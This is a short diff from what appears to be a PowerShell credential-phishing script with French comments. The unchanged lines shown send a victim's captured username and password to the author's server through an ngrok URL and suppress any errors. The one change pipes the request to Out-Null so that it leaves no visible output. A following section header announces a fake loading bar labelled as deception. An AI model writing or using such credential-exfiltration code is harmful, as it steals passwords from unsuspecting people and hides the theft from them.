@@ -18,7 +18,7 @@ if ($credential) {
     # Envoi vers ton serveur Python via Ngrok (Utilise POST pour plus de propreté)
     # L'argument -UseBasicParsing évite l'erreur Internet Explorer
     $body = "USER: $user | PASS: $pass"
-    Invoke-WebRequest -Uri $NGROK_URL -Method Post -Body $body -UseBasicParsing -ErrorAction SilentlyContinue;
+    Invoke-WebRequest -Uri $NGROK_URL -Method Post -Body $body -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null;
 }
 
 # 2. BARRE DE CHARGEMENT VISUELLE (DECEPTION)
